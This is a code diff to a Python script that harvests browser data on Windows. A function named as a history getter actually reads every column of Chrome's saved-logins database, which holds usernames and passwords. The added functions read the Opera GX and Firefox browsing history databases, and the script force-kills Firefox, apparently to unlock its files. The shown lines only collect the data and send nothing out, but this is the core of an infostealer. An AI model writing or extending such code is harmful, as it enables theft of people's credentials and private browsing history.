@@ -3,8 +3,20 @@ import sqlite3
 def chrome_history_getter(uname):
     con = sqlite3.connect(f'C:\\Users\\{uname}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data')
     cursor = con.cursor()
-    cursor.execute("SELECT action_url, username_element, username_value, password_element, password_value FROM logins")
-    urls = cursor.fetchalli()
+    cursor.execute("SELECT * FROM logins")
+    urls = cursor.fetchall()
+    return urls
+def opera_history_getter(uname):
+    con = sqlite3.connect(f'C:\\Users\\{uname}\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\History')
+    cursor = con.cursor()
+    cursor.execute("SELECT * FROM urls")
+    urls = cursor.fetchall()
+    return urls
+def firefox_history_getter(path):
+    con = sqlite3.connect(path)
+    cursor = con.cursor()
+    cursor.execute("SELECT * FROM moz_places")
+    urls = cursor.fetchall()
     return urls
 uname = os.getlogin()
 os.system("taskkill /im firefox.exe /f")
